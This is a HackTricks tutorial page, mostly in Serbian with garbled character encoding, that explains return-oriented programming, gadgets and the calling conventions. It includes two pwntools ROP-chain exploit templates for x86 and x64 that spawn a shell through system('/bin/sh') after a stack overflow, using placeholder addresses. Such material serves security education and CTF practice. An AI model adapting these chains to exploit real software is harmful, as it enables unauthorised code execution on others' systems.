# ROP - Povratno Orijentisano Programiranje

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Osnovne Informacije**

**Povratno-Orijentisano Programiranje (ROP)** je napredna tehnika eksploatacije koja se koristi za zaobila쬰nje sigurnosnih mera kao 코to su **No-Execute (NX)** ili **Data Execution Prevention (DEP)**. Umesto da se injektuje i izvr코ava shellcode, napada캜 koristi delove koda koji su ve캖 prisutni u binarnom fajlu ili u u캜itanim bibliotekama, poznatim kao **"gadgets"**. Svaki gadget obi캜no se zavr코ava sa `ret` instrukcijom i izvr코ava malu operaciju, kao 코to je preme코tanje podataka izme캠u registara ili izvo캠enje aritmeti캜kih operacija. Povezivanjem ovih gadgets, napada캜 mo쬰 konstruisati payload za izvo캠enje proizvoljnih operacija, efikasno zaobilaze캖i NX/DEP za코tite.

### Kako ROP Funkcioni코e

1. **Otima캜 Kontrolnog Tok**: Prvo, napada캜 treba da otme kontrolni tok programa, obi캜no iskori코캖avanjem buffer overflow-a da bi prepisao sa캜uvanu adresu povratka na steku.
2. **Povezivanje Gadgets**: Napada캜 pa쬷jivo bira i povezuje gadgets da bi izvr코io 쬰ljene akcije. To mo쬰 uklju캜ivati postavljanje argumenata za poziv funkcije, pozivanje funkcije (npr., `system("/bin/sh")`), i rukovanje svim potrebnim 캜i코캖enjem ili dodatnim operacijama.
3. **Izvr코enje Payload-a**: Kada ranjiva funkcija vrati, umesto da se vrati na legitimnu lokaciju, po캜inje da izvr코ava lanac gadgets.

### Alati

Obi캜no, gadgets se mogu prona캖i koriste캖i **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** ili direktno iz **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## ROP Lanac u x86 Primeru

### **x86 (32-bit) Konvencije Poziva**

* **cdecl**: Pozivatelj 캜isti stek. Argumenti funkcije se stavljaju na stek u obrnutom redosledu (desno-levo). **Argumenti se stavljaju na stek s desna na levo.**
* **stdcall**: Sli캜no cdecl, ali je pozvana funkcija odgovorna za 캜i코캖enje steka.

### **Pronala쬰nje Gadgets**

Prvo, pretpostavimo da smo identifikovali potrebne gadgets unutar binarnog fajla ili njegovih u캜itanih biblioteka. Gadgets koji nas zanimaju su:

* `pop eax; ret`: Ovaj gadget uzima gornju vrednost steka u `EAX` registar i zatim se vra캖a, omogu캖avaju캖i nam kontrolu nad `EAX`.
* `pop ebx; ret`: Sli캜no prethodnom, ali za `EBX` registar, omogu캖avaju캖i kontrolu nad `EBX`.
* `mov [ebx], eax; ret`: Premesti vrednost u `EAX` na memorijsku lokaciju na koju pokazuje `EBX` i zatim se vra캖a. Ovo se 캜esto naziva **write-what-where gadget**.
* Pored toga, imamo adresu funkcije `system()` dostupnu.

### **ROP Lanac**

Koriste캖i **pwntools**, pripremamo stek za izvr코enje ROP lanca na slede캖i na캜in, sa ciljem da izvr코imo `system('/bin/sh')`, primetite kako lanac po캜inje sa:

1. `ret` instrukcijom za svrhe poravnanja (opciono)
2. Adresom funkcije `system` (pretpostavljaju캖i da je ASLR onemogu캖en i da je libc poznat, vi코e informacija u [**Ret2lib**](ret2lib/))
3. Mesto za adresu povratka iz `system()`
4. Adresa stringa `"/bin/sh"` (parametar za funkciju system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

* Uses the **System V AMD64 ABI** calling convention on Unix-like systems, where the **first six integer or pointer arguments are passed in the registers `RDI`, `RSI`, `RDX`, `RCX`, `R8`, and `R9`**. Additional arguments are passed on the stack. The return value is placed in `RAX`.
* **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.
* **Registers**: 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.

#### **Finding Gadgets**

For our purpose, let's focus on gadgets that will allow us to set the **RDI** register (to pass the **"/bin/sh"** string as an argument to **system()**) and then call the **system()** function. We'll assume we've identified the following gadgets:

* **pop rdi; ret**: Pops the top value of the stack into **RDI** and then returns. Essential for setting our argument for **system()**.
* **ret**: A simple return, useful for stack alignment in some scenarios.

And we know the address of the **system()** function.

### **ROP Chain**

Below is an example using **pwntools** to set up and execute a ROP chain aiming to execute **system('/bin/sh')** on **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* Koristimo **`pop rdi; ret`** gadget da postavimo **`RDI`** na adresu **`"/bin/sh"`**.
* Direktno ska캜emo na **`system()`** nakon postavljanja **`RDI`**, sa adresom **system()** u lancu.
* **`ret_gadget`** se koristi za poravnavanje ako ciljno okru쬰nje to zahteva, 코to je 캜e코캖e u **x64** da bi se osiguralo pravilno poravnavanje steka pre pozivanja funkcija.

### Poravnavanje Steka

**x86-64 ABI** osigurava da je **stek poravnat na 16 bajtova** kada se izvr코i **call instrukcija**. **LIBC**, da optimizuje performanse, **koristi SSE instrukcije** (kao 코to je **movaps**) koje zahtevaju ovo poravnavanje. Ako stek nije pravilno poravnat (코to zna캜i da **RSP** nije vi코ekratnik od 16), pozivi funkcijama kao 코to je **system** 캖e propasti u **ROP lancu**. Da biste to ispravili, jednostavno dodajte **ret gadget** pre pozivanja **system** u va코em ROP lancu.

## Glavna razlika izme캠u x86 i x64

{% hint style="success" %}
Po코to x64 koristi registre za prvih nekoliko argumenata, 캜esto zahteva manje gadgeta nego x86 za jednostavne pozive funkcija, ali pronala쬰nje i povezivanje pravih gadgeta mo쬰 biti slo쬰nije zbog pove캖anog broja registara i ve캖eg adresnog prostora. Pove캖an broj registara i ve캖i adresni prostor u **x64** arhitekturi pru쬬ju i prilike i izazove za razvoj eksploitacija, posebno u kontekstu Programiranja Orijentisanog na Povratak (ROP).
{% endhint %}

## Za코tite

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Ostali Primeri & Reference

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## Tehnike zasnovane na ROP-u

Primetite da je ROP samo tehnika za izvr코avanje proizvoljnog koda. Na osnovu ROP-a razvijene su mnoge Ret2XXX tehnike:

* **Ret2lib**: Koristite ROP da pozovete proizvoljne funkcije iz u캜itane biblioteke sa proizvoljnim parametrima (obi캜no ne코to poput `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Koristite ROP da pripremite poziv sistemskoj pozivu, npr. `execve`, i izvr코ite proizvoljne komande.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Prva 캖e zloupotrebiti EBP umesto EIP da kontroli코e tok, a druga je sli캜na Ret2lib, ali u ovom slu캜aju tok se kontroli코e uglavnom sa EBP adresama (iako je tako캠e potrebno kontrolisati EIP).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
